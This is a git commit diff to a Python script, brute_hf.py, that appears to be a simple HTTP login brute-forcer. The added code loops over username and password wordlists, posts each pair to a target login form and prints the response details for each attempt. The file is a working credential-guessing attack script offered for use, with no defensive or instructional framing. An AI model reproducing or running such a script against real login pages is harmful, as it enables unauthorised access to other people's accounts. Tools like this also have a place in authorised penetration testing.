3079190e2ec8be92734eafbc3fb8cb12fef67d4d
Gabriel-Lima232 <68028935+Gabriel-Lima232@users.noreply.github.com>
2021-06-28 20:00:45 -0300

    Update brute_hf.py

--- brute_hf.py
+++ brute_hf.py
@@ -1,10 +1,20 @@
 import sys
 import requests
+import time
+from bs4 import BeautifulSoup
 
-def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
-def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+def prLightPurple(skk): print("\033[94m{}\033[00m" .format(skk))
+def prRed(skk): print("\033[91m{}\033[00m" .format(skk))
 
-prLightPurple(""""                                                         
+banner = """
+User:{}
+Password:{}
+Teste:{}
+Status-Code:{}
+Tamanho:{}
+"""
+
+prLightPurple("""                                                         
  @@@@@@   @@@  @@@@@@@@@@   @@@@@@@   @@@       @@@@@@@@  
 @@@@@@@   @@@  @@@@@@@@@@@  @@@@@@@@  @@@       @@@@@@@@  
 !@@       @@!  @@! @@! @@!  @@!  @@@  @@!       @@!       
@@ -25,22 +35,28 @@ prLightPurple(""""
 !!!@!!!!  !!@!@!    !@!  !!!    !!!    !!!!!:             
 !!:  !!!  !!: :!!   !!:  !!!    !!:    !!:                
 :!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:                
- :: ::::  ::   :::  ::::: ::     ::     :: ::::           
+:: ::::  ::   :::  ::::: ::     ::     :: ::::           
 :: : ::    :   : :   : :  :      :     : :: ::            
 """)
 
-if len(sys.argv) <= 3 | len(sys.argv) >= 3:
+
+def readFiles(file):
+    with open(file, 'r') as nada:
+        return nada.readlines()
+
+if len(sys.argv) != 4:    
     prRed("[-] How to use -> python3 http://site.com user.txt password.txt")
 else:
     url = sys.argv[1]
-    data = {"login": sys.argv[2], "Password": sys.argv[3], "Submit": "Login"}
-    res = requests.post(url, data)
-    print(res.text)
-
-#TO DO:
-
-#file01 = open('user.txt', 'r')
-#fileUser = file.readlines()
-
-#file02 = open('password.txt', 'r')
-#filePassword = file02.readlines()
+    cont = 0
+    for i in readFiles(sys.argv[2]):
+        for j in readFiles(sys.argv[3]): 
+            data = {"login": i, "Password": j, "Submit": "Login"}
+            res = requests.post(url, data)
+            soup = BeautifulSoup(res.text, 'html.parser')
+            try:
+                end = soup.findAll('td')[-1]
+                print(banner.format(i.replace("\n", ""),j.replace("\n", ""),str(end).split('>')[-3].split('<')[0], res.status_code, len(res.content)))
+            except IndexError:
+                print(soup.prettify())   
+            time.sleep(5)
